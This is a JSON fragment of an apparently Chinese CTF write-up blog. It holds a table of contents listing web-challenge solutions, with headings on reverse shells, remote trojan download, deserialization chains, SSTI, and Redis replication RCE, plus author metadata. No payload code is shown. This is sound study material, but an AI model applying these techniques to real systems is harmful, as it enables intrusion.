href=\"#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7\"><span class=\"toc-text\">牢牢记住，逝者为大</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%80-%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">思路一 反弹shell</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">思路二 远程下载木马</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezRCE\"><span class=\"toc-text\">ezRCE</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CISCN2023\"><span class=\"toc-text\">CISCN2023</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#linux%E5%91%BD%E4%BB%A4-%E8%BD%AF%E9%93%BE%E6%8E%A5-ln-s\"><span class=\"toc-text\">linux命令 软链接  ln -s</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Unzip\"><span class=\"toc-text\">Unzip</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CISCN2024\"><span class=\"toc-text\">CISCN2024</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#simple-php\"><span class=\"toc-text\">simple php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cphp%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">命令行运行php代码</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#LitCTF2024\"><span class=\"toc-text\">LitCTF2024</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">蚁剑流量分析特征</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Lit2023\"><span class=\"toc-text\">Lit2023</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#zip%E4%BC%AA%E5%8A%A0%E5%AF%86-%E7%89%B9%E5%BE%81\"><span class=\"toc-text\">zip伪加密 特征</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#BaseCTF\"><span class=\"toc-text\">BaseCTF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1z-php\"><span class=\"toc-text\">1z_php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第一部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6%E8%BD%AC%E5%8C%96%E8%A7%84%E5%88%99\"><span class=\"toc-text\">非法字符转化规则</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#intval%E5%92%8Cctype-alpha%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">intval和ctype_alpha绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第二部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#preg-match%E5%92%8C-stripos%E7%BB%84%E5%90%88%EF%BC%81%EF%BC%81%EF%BC%81%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">preg_match和!stripos组合！！！长度绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第三部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%B9%8BSplFileObject\"><span class=\"toc-text\">PHP原生类之SplFileObject</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Really-EZ-POP\"><span class=\"toc-text\">Really EZ POP</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#php%E7%B1%BB%E4%B8%AD%E7%9A%84%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7\"><span class=\"toc-text\">php类中的私有属性</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%A9%E5%8E%9F%E7%A5%9E%E7%8E%A9%E7%9A%84\"><span class=\"toc-text\">玩原神玩的</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">第一部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sizeof-POST-%E2%80%98len%E2%80%99-sizeof-array\"><span class=\"toc-text\">sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">第二部分</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">第三部分</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%90%AC%E4%B8%8D%E8%A7%81%E6%88%91%E7%9A%84%E5%A3%B0%E9%9F%B3\"><span class=\"toc-text\">听不见我的声音</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#cmd-%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">$(cmd)  反引号的利用</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Aura%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9\"><span class=\"toc-text\">Aura酱的礼物</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">第一部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#data-%E5%86%99%E5%85%A5\"><span class=\"toc-text\">data:&#x2F;&#x2F;写入</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">第二部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#url-%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99\"><span class=\"toc-text\">url@解析规则</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">解法一</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">解法二</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%80%E7%BB%88payload\"><span class=\"toc-text\">最终payload</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Back-to-the-future\"><span class=\"toc-text\">Back to the future</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">git文件泄露</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F\"><span class=\"toc-text\">flag直接读取不就行了？</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">php原生类的使用</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Jinja-Mark\"><span class=\"toc-text\">Jinja Mark</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93\"><span class=\"toc-text\">python原型链污染</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95\"><span class=\"toc-text\">绕过黑名单</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSTI%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SSTI注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9C%A3%E9%92%A5%E4%B9%8B%E6%88%981-0\"><span class=\"toc-text\">圣钥之战1.0</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%85%B3%E7%B3%BB\"><span class=\"toc-text\">特殊变量与原型链污染的关系</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%BE%A1%E7%BD%912024wp\"><span class=\"toc-text\">御网2024wp</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#misc\"><span class=\"toc-text\">misc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%9A%84%E9%80%9A%E7%9F%A5\"><span class=\"toc-text\">信息安全大赛的通知</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">编码转换</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#coding-analyse\"><span class=\"toc-text\">coding_analyse</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WEB\"><span class=\"toc-text\">WEB</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#input-data\"><span class=\"toc-text\">input_data</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#admin\"><span class=\"toc-text\">admin</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Flask\"><span class=\"toc-text\">Flask</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A6%82%E6%AD%A4%E5%A4%9A%E7%9A%84FLAG\"><span class=\"toc-text\">如此多的FLAG</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CRYPTO\"><span class=\"toc-text\">CRYPTO</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Reverse\"><span class=\"toc-text\">Reverse</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ez-apk\"><span class=\"toc-text\">ez_apk</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%BA%E5%99%A8%E7%8C%AB\"><span class=\"toc-text\">机器猫</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#RE4\"><span class=\"toc-text\">RE4</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NSS%E7%B3%BB%E5%88%97\"><span class=\"toc-text\">NSS系列</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%BC%E5%90%88\"><span class=\"toc-text\">文件包含和序列化综合</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%84%E5%AD%A6%E8%AF%A1%E5%BC%82sql%E9%A2%98\"><span class=\"toc-text\">玄学诡异sql题</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#prize%E7%B3%BB%E5%88%97\"><span class=\"toc-text\">prize系列</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#prize-p1\"><span class=\"toc-text\">prize_p1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E4%BB%BD\"><span class=\"toc-text\">第一部份</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-3\"><span class=\"toc-text\">第二部分</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">第三部分</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%94%9F%E4%BA%A7phar%E6%96%87%E4%BB%B6-ph1-phar\"><span class=\"toc-text\">生产phar文件 ph1.phar</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E6%94%B9ph1-phar%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87%E5%BC%82%E5%B8%B8%E6%8A%9B%E5%87%BA\"><span class=\"toc-text\">修改ph1.phar文件中的序列化字符串绕过异常抛出</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D%E7%AD%BE%E5%90%8D\"><span class=\"toc-text\">修复签名</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%8B%E7%BC%A9%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">压缩绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">数组绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#prize-p5\"><span class=\"toc-text\">prize_p5</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%A2%98%E5%B9%B2\"><span class=\"toc-text\">题干</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80-1\"><span class=\"toc-text\">解法一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8\"><span class=\"toc-text\">序列化字符串逃逸</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C-1\"><span class=\"toc-text\">解法二</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%80%9A%E8%BF%87php%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">通过php原生类来读取文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9C%A8%E9%80%9A%E8%BF%87SplFileObject%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">在通过SplFileObject读取文件内容</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%89%8B%E5%8A%A8%E6%94%B9%E9%93%BE%E5%AD%90\"><span class=\"toc-text\">手动改链子</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%B0%91%E5%B9%B4%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B\"><span class=\"toc-text\">第四届极客少年挑战赛初赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezunserilize\"><span class=\"toc-text\">ezunserilize</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E6%9E%84%E9%80%A0%E5%85%AB%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">解法一：构造八进制命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%A9%BA%E6%A0%BC%E6%9B%BF%E6%8D%A2-t\"><span class=\"toc-text\">空格替换\\t</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#ls\"><span class=\"toc-text\">ls\t&#x2F;</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#cat-4l2g\"><span class=\"toc-text\">cat\t&#x2F;4l2g</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Amore%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">解法二：more绕过</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NISACTF-2022\"><span class=\"toc-text\">NISACTF 2022</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bingdundun\"><span class=\"toc-text\">bingdundun~</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#babyupload\"><span class=\"toc-text\">babyupload</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CVE-2020-35736\"><span class=\"toc-text\">CVE-2020-35736</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8-os-path-join-%E5%A4%84%E7%90%86%E8%B7%AF%E5%BE%84%E7%9A%84%E6%8B%BC%E6%8E%A5%E9%97%AE%E9%A2%98\"><span class=\"toc-text\">利用 os.path.join 处理路径的拼接问题</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#babyserialize\"><span class=\"toc-text\">babyserialize</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#pop-4%E5%AF%B9%E8%B1%A1\"><span class=\"toc-text\">pop 4对象</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2024%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B\"><span class=\"toc-text\">2024年春秋杯网络安全联赛夏季赛</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#brother\"><span class=\"toc-text\">brother</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%9B%B4%E6%8E%A5fenjing%E4%B8%80%E6%8A%8A%E6%A2%AD\"><span class=\"toc-text\">直接fenjing一把梭</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#UDF%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">UDF提权</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2020%E7%BD%91%E9%BC%8E%E6%9D%AF\"><span class=\"toc-text\">2020网鼎杯</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRFMe\"><span class=\"toc-text\">SSRFMe</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSRF%E4%B9%8BRedis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%AE%9E%E7%8E%B0RCE\"><span class=\"toc-text\">SSRF之Redis主从复制实现RCE</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">redis常用命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BB%BA%E7%AB%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%EF%BC%8C%E6%9C%893%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9A\"><span class=\"toc-text\">建立主从复制，有3种方式：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8exp%E8%BF%9B%E8%A1%8Crce\"><span class=\"toc-text\">使用exp进行rce</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E5%85%A5%E5%88%B0%E7%9B%AE%E6%A0%87%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">进入到目标目录</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%8E%E6%9C%AC%E5%9C%B0%E6%B7%BB%E5%8A%A0%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">从本地添加文件</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A0%E8%BD%BDexp\"><span class=\"toc-text\">加载exp</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#rce\"><span class=\"toc-text\">rce</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A5%E4%B8%8A%E4%B8%89%E4%B8%AA%E5%91%BD%E4%BB%A4%E5%8F%AF%E4%BB%A5%E5%90%88%E5%B9%B6\"><span class=\"toc-text\">以上三个命令可以合并</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">也可以进行反弹shell</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#2023%E8%93%9D%E6%A1%A5%E6%9D%AFWP\"><span class=\"toc-text\">2023蓝桥杯WP</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%E7%88%AC%E8%99%AB%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">1.爬虫协议</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-packet\"><span class=\"toc-text\">2.packet</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-cc\"><span class=\"toc-text\">3.cc</span></a></li></ol></li></ol>","author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"php特性","uid":"cd1787040df7226f24b8f728e6089b8f","slug":"php特性","date":"2024-10-25T06:19:58.000Z","updated":"2024-10-25T06:29:48.124Z","comments":true,"path":"api/articles/php特性.json","keywords":null,"cover":"/image/7.jpg","text":"php特性1.intval 也就是说传入是数组时，返回值为1 (弱比较) 此函数会将 + 空格来进行跳过判断 当base=0时，进制可以自定义 Web92传入其...","permalink":"/post/php特性","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[{"name":"ctf","slug":"ctf","count":6,"path":"api/tags/ctf.json"}],"author":{"name":"Sygsdsg","slug":"blog-author","avatar":"https://img.picui.cn/free/2024/10/23/6718a2ef955e1.jpg","link":"/","description":"嘻嘻","socials":{"github":"https://github.com/Sygsdsg/Sygsdsg.github.io","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}